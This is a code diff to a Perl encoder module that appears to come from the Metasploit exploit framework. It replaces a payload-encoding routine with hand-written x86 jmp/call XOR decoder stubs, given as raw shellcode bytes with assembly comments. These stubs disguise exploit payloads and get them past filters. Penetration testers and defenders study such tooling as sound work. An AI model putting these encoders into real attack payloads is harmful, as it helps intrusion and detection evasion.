@@ -9,11 +9,10 @@
 
 package Msf::Encoder::Pex;
 use strict;
-use base 'Msf::Encoder';
+use base 'Msf::Encoder::XorDword';
 use Pex::Encoder;
 
 my $advanced = {
-  'PexDebug' => [0, 'Sets the Pex Debugging level (zero is no output)'],
 };
 
 my $info = {
@@ -35,11 +34,47 @@ sub new {
   return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
 }
 
-sub EncodePayload {
+# Variable Length Decoder Using jmp/call 26/29 bytes.
+# Uses smaller encoder if payload is <= 512 bytes
+sub _GenEncoder {
   my $self = shift;
-  my $rawshell = shift;
-  my $badChars = shift;
-  return(Pex::Encoder::Encode('x86', 'DWord Xor', 'JmpCall', $rawshell, $badChars, $self->GetLocal('PexDebug')));
+  my $xor = shift;
+  my $len = shift;
+  my $xorkey = pack('V', $xor);
+  my $l = Pex::Encoder::PackLength($len);
+
+  # spoon's smaller variable-length encoder
+  my $decoder;
+  if($l->{'negSmall'}) {
+    # 26 bytes
+    $decoder =
+      "\xeb\x13".                         # jmp SHORT 0x15 (xor_end)
+      "\x5e".                             # xor_begin: pop esi
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x83\xe9". $l->{'negLengthByte'} . # sub ecx, BYTE -xorlen
+      "\x81\x36". $xorkey .               # xor_xor: xor DWORD [esi],xorkey
+      "\x83\xee\xfc".                     # sub $esi,-4
+      "\xe2\xf5".                         # loop 0x8 (xor_xor)
+      "\xeb\x05".                         # jmp SHORT 0x1a (xor_done)
+      "\xe8\xe8\xff\xff\xff";             # xor_end: call 0x2 (xor_begin)
+                                          # xor_done:
+  }
+  else {
+    # 29 bytes
+    $decoder =
+      "\xeb\x16".                         # jmp SHORT 0x18 (xor_end)
+      "\x5e".                             # xor_begin: pop esi
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x81\xe9". $l->{'negLength'} .     # sub ecx, -xorlen
+      "\x81\x36". $xorkey .               # xor_xor: xor DWORD [esi],xorkey
+      "\x83\xee\xfc".                     # sub $esi,-4
+      "\xe2\xf5".                         # loop 0xb (xor_xor)
+      "\xeb\x05".                         # jmp SHORT 0x1d (xor_done)
+      "\xe8\xe5\xff\xff\xff";             # xor_end: call 0x2 (xor_begin)
+                                          # xor_done:
+  }
+
+  return($decoder);
 }
 
 1;
